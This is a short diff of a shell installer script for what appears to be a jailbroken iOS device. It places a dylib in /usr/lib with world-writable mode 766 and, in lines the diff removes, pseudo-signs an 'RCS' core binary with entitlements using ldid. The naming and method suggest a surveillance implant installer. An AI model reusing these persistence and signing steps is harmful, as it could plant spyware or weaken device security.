@@ -159,9 +159,9 @@ if [ -e /usr/lib/$RCS_DYLIB ]
   exit 6
 fi
 
-# set attrib
-echo -n $0: `date` - chmod 755 $RCS_BASE/$RCS_DIR/$RCS_CORE >> $RCS_LOG
-RCS_RET=`chmod 755 $RCS_BASE/$RCS_DIR/$RCS_CORE 2>&1`
+# set attrib for dylib (cydia installer)
+echo -n $0: `date` - chmod 766 /usr/lib/$RCS_DYLIB >> $RCS_LOG
+RCS_RET=`chmod 766 /usr/lib/$RCS_DYLIB 2>&1`
 
 if [ $? -eq 0 ]
  then
@@ -171,12 +171,9 @@ if [ $? -eq 0 ]
   exit 7
 fi
 
-# write down the entitlements
-echo -e $RCS_ENT_FILE > ./$RCS_ENT_NAME
-
-# rebuild the pseduo sig
-echo -n $0: `date` - ldid -S $RCS_BASE/$RCS_DIR/$RCS_CORE >> $RCS_LOG
-RCS_RET=`./ldid -S$RCS_ENT_NAME $RCS_BASE/$RCS_DIR/$RCS_CORE 2>&1`
+# set attrib
+echo -n $0: `date` - chmod 755 $RCS_BASE/$RCS_DIR/$RCS_CORE >> $RCS_LOG
+RCS_RET=`chmod 755 $RCS_BASE/$RCS_DIR/$RCS_CORE 2>&1`
 
 if [ $? -eq 0 ]
  then
